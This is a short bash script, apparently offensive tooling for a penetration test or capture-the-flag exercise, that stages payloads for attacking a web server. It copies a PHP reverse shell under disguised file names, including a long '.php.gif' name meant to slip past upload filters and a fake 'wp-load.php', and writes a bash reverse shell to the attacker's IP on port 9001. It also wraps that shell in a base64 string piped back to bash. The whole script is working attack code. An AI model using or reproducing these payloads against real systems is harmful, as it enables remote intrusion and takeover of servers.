#!/bin/bash

cp -r www_skel/ www/

sed -i "s/10.2.2.1/$1/g" www/*

cp www/php_rev.php www/HelloThere-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
cp www/php_rev.php www/wp-load.php
cp www/php_rev.php www/hellothere.php

echo "bash -c 'bash -i >& /dev/tcp/$1/9001 0>&1'" >> www/shell.sh

SHELL=$(cat www/shell.sh | base64 -w 0)
echo "echo -n '$SHELL' | base64 -d | bash" >> www/shell.b64.sh
